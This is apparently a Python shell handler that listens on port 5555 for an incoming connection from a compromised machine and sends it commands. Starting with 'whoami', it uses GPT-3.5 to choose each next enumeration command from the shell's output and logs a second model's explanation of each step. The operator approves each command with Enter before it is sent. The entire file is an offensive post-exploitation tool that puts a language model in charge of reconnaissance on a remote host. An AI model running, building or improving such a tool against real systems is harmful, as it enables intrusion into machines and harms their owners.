import subprocess
import openai
import socket
import time

# Reading OpenAI API key
with open('file.txt', 'r') as f:
    open_ai_api_key = f.read()
openai.api_key = open_ai_api_key.strip()

# Reading config file
with open('configfile.txt', 'r') as g:
    configfile = g.read()

message_stack = [
    {"role": "system", "content": configfile}
]
message_stack2 = [
    {"role": "system", "content": "Describe why the command was executed for enumeration and what the response means"}
]

def enumerator(prompt, message_stack):
    user_append = {"role": "user", "content": prompt}
    message_stack.append(user_append)

    response = openai.ChatCompletion.create(
        model="gpt-3.5-turbo",
        messages=message_stack,
        max_tokens=150,
        temperature=0.5
    )

    openai_response = response['choices'][0]['message']['content'].strip()
    system_message = {"role": "assistant", "content": openai_response}
    message_stack.append(system_message)
    with open('logs.txt', 'a') as g:
        g.write(prompt + '\n')
        g.write('\n' + openai_response + '\n')
    return openai_response

def explainer(prompt2, message_stack2):
    user_append = {"role": "user", "content": prompt2}
    message_stack2.append(user_append)

    response = openai.ChatCompletion.create(
        model="gpt-3.5-turbo",
        messages=message_stack2,
        max_tokens=1500,
        temperature=0.5
    )
    openai_explaination = response['choices'][0]['message']['content'].strip()
    system_message = {"role": "assistant", "content": openai_explaination}
    message_stack2.append(system_message)

    return openai_explaination

def main():
    server_port = 5555  # Changed port to 5555

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', server_port))
    sock.listen(1)

    print(f"Listening on port {server_port}...")

    conn, addr = sock.accept()
    print(f"Connection from {addr}")

    try:
        command = 'whoami'
        conn.sendall((command+'\n').encode('utf-8'))
        print('Sent Command: whoami')
        enumerator_response=''
        
        while True:
            result = conn.recv(1024).decode('utf-8').strip().replace('$ ','')
            enumerator_response = enumerator(result, message_stack)
            print(f"Received response: {result}")

            explaination = explainer(enumerator_response + '\n' + result, message_stack2)
            print(f"Explanation: {explaination}")
            #print(f"Enumerator response: {enumerator_response}")

            with open('enum_logs.txt', 'a') as h:
                h.write(explaination + '\n')
            input(f'Press Enter to send:{enumerator_response}')
            conn.sendall((enumerator_response + '\n').encode('utf-8'))
            
    except Exception as e:
        print(f"Error: {str(e)}")
        conn.sendall(f'Error: {str(e)}\n'.encode('utf-8'))
    finally:
        conn.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()
